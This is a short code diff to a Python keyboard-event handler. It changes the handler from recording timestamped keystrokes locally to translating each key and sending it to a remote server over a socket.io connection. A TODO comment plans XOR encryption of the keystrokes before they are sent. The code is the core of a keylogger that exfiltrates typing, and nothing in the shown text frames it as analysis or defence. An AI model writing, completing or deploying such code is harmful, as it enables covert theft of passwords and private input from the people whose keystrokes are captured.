@@ -1,17 +1,10 @@
 
-from datetime import datetime
+translate_key = {'space': ' ', 'enter': '\n', 'tab': '\t', 'caps lock': ''}
 
-details_keys = []
-translat_key = {'space': ' ', 'enter': '\n', 'tab': '\t', 'caps lock': ''}
+def on_key(e, sio):
+    """ Handle key press event and send to server via socket.io.
+    """
+    key_value = translate_key.get(e.name, e.name) # get the actual key value
 
-def on_key(e):
-    key_value = " "
-    human_time = datetime.fromtimestamp(e.time).strftime('%Y-%m-%d %H:%M')
-    if e.name == 'backspace':
-        if details_keys:
-            details_keys.pop()
-            return details_keys
-    key_value = translat_key.get(e.name, e.name)
-    details_keys.append({human_time: key_value})
-    return details_keys
-
+    # TODO(encrypt): encrypt the key_value with XOR before sending
+    sio.emit('ev', {'ev': key_value})
